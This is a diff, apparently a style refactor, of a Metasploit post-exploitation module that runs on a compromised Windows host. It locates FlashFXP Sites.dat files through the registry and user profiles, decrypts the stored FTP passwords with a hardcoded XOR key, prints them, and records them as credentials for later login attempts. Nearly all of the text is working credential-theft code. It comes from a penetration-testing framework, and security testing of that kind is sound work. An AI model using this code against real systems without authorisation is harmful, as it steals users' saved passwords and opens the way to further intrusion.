@@ -37,22 +37,22 @@ class MetasploitModule < Msf::Post
 
   def run
     # Checks if the Site data is stored in a generic location  for all users
-    flash_reg = "HKLM\\SOFTWARE\\FlashFXP"
-    flash_reg_ver = registry_enumkeys("#{flash_reg}")
+    flash_reg = 'HKLM\\SOFTWARE\\FlashFXP'
+    flash_reg_ver = registry_enumkeys(flash_reg.to_s)
 
     # Ini paths
     @fxppaths = []
 
     unless flash_reg_ver.nil?
       software_key = "#{flash_reg}\\#{flash_reg_ver.join}"
-      generic_path = registry_getvaldata(software_key, "InstallerDataPath") || ""
-      unless generic_path.include? "%APPDATA%"
-        @fxppaths << generic_path + "\\Sites.dat"
+      generic_path = registry_getvaldata(software_key, 'InstallerDataPath') || ''
+      unless generic_path.include? '%APPDATA%'
+        @fxppaths << generic_path + '\\Sites.dat'
       end
     end
 
-    grab_user_profiles().each do |user|
-      next if user['AppData'] == nil
+    grab_user_profiles.each do |user|
+      next if user['AppData'].nil?
 
       tmpath = user['AppData'] + '\\FlashFXP\\'
       get_ver_dirs(tmpath)
@@ -64,80 +64,76 @@ class MetasploitModule < Msf::Post
   end
 
   def get_ver_dirs(path)
-    begin
-      session.fs.dir.foreach(path) do |sub|
-        next if sub =~ /^(\.|\.\.)$/
+    session.fs.dir.foreach(path) do |sub|
+      next if sub =~ /^(\.|\.\.)$/
 
-        @fxppaths << "#{path}#{sub}\\Sites.dat"
-      end
-    rescue
-      print_error("The following path could not be accessed or does not exist: #{path}")
+      @fxppaths << "#{path}#{sub}\\Sites.dat"
     end
+  rescue StandardError
+    print_error("The following path could not be accessed or does not exist: #{path}")
   end
 
   def get_ini(filename)
-    begin
-      config = client.fs.file.new(filename, 'r')
-      parse = config.read
-      ini = Rex::Parser::Ini.from_s(parse)
+    config = client.fs.file.new(filename, 'r')
+    parse = config.read
+    ini = Rex::Parser::Ini.from_s(parse)
 
-      if ini == {}
-        print_error("Unable to parse file, may be encrypted using external password: #{filename}")
-      end
-
-      ini.each_key do |group|
-        host = ini[group]['IP']
-        username = ini[group]['user']
-        epass = ini[group]['pass']
-        port = ini[group]['port']
-        next if epass == nil or epass == ""
-
-        passwd = decrypt(epass)
-
-        print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
-        service_data = {
-          address: Rex::Socket.getaddress(host),
-          port: port,
-          protocol: "tcp",
-          service_name: "ftp",
-          workspace_id: myworkspace_id
-        }
-
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: self.refname,
-          username: username,
-          private_data: passwd,
-          private_type: :password
-        }
-
-        credential_core = create_credential(credential_data.merge(service_data))
-
-        login_data = {
-          core: credential_core,
-          access_level: "User",
-          status: Metasploit::Model::Login::Status::UNTRIED
-        }
-
-        create_credential_login(login_data.merge(service_data))
-      end
-    rescue
-      print_status("Either could not find or could not open file #{filename}")
+    if ini == {}
+      print_error("Unable to parse file, may be encrypted using external password: #{filename}")
     end
+
+    ini.each_key do |group|
+      host = ini[group]['IP']
+      username = ini[group]['user']
+      epass = ini[group]['pass']
+      port = ini[group]['port']
+      next if epass.nil? || (epass == '')
+
+      passwd = decrypt(epass)
+
+      print_good("*** Host: #{host} Port: #{port} User: #{username}  Password: #{passwd} ***")
+      service_data = {
+        address: Rex::Socket.getaddress(host),
+        port: port,
+        protocol: 'tcp',
+        service_name: 'ftp',
+        workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        username: username,
+        private_data: passwd,
+        private_type: :password
+      }
+
+      credential_core = create_credential(credential_data.merge(service_data))
+
+      login_data = {
+        core: credential_core,
+        access_level: 'User',
+        status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      create_credential_login(login_data.merge(service_data))
+    end
+  rescue StandardError
+    print_status("Either could not find or could not open file #{filename}")
   end
 
   def decrypt(pwd)
-    key = "yA36zA48dEhfrvghGRg57h5UlDv3"
-    pass = ""
-    cipher = [pwd].pack("H*")
+    key = 'yA36zA48dEhfrvghGRg57h5UlDv3'
+    pass = ''
+    cipher = [pwd].pack('H*')
 
-    (0..(cipher.length) - 2).each do |index|
-      xored = cipher[index + 1, 1].unpack("C").first ^ key[index, 1].unpack("C").first
-      if ((xored - cipher[index, 1].unpack("C").first < 0))
+    (0..cipher.length - 2).each do |index|
+      xored = cipher[index + 1, 1].unpack('C').first ^ key[index, 1].unpack('C').first
+      if ((xored - cipher[index, 1].unpack('C').first < 0))
         xored += 255
       end
-      pass << (xored - cipher[index, 1].unpack("C").first).chr
+      pass << (xored - cipher[index, 1].unpack('C').first).chr
     end
     return pass
   end
